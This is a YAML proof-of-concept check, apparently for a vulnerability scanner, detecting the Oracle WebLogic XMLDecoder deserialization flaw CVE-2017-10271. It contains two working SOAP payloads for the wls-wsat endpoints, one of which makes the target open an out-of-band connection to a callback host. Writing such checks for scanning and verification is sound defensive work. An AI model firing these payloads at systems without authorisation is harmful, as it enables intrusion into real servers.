name: yaml-poc-oracle-weblogic_server-unauthorized_access-CVE-2017-10271
binding: 099312bc-de71-40e7-a5ae-684c477cab6d
detail:
    author: lianjian.chen
    links:
        - http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html
        - http://www.securityfocus.com/bid/101304
        - http://www.securitytracker.com/id/1039608
        - https://github.com/c0mmand3rOpSec/CVE-2017-10271
        - https://www.exploit-db.com/exploits/43458/
        - https://www.exploit-db.com/exploits/43924/
        - https://www.securityfocus.com/bid/101304
    vulnerability:
        id: 3a37ebaf-958c-4068-b26e-fb3b0cc65309
        level: high
    warning: Harmless
transport: http
set:
    reverse: newReverse()
    reverseDomain: reverse.domain
rules:
    v130:
        request:
            cache: true
            method: POST
            path: /wls-wsat/ParticipantPortType
            headers:
                Content-Type: text/xml
            body: <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.4.0" class="java.beans.XMLDecoder"><void class="java.lang.String"><string>xxx</string></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
            follow_redirects: true
        expression: response.status == 500 && response.body.ibcontains(b"<faultstring>0</faultstring>")
    reverse0:
        request:
            cache: true
            method: POST
            path: /wls-wsat/CoordinatorPortType
            headers:
                Content-Type: text/xml
            body: <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">  <soapenv:Header> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  <java> <void class="java.net.URL"> <string>http://{{reverseDomain}}</string> <void method="openConnection"><void method="getInputStream"/></void></void></java> </work:WorkContext> </soapenv:Header>  <soapenv:Body/> </soapenv:Envelope>
            follow_redirects: true
        expression: reverse.wait(5)
expression: v130() || reverse0()
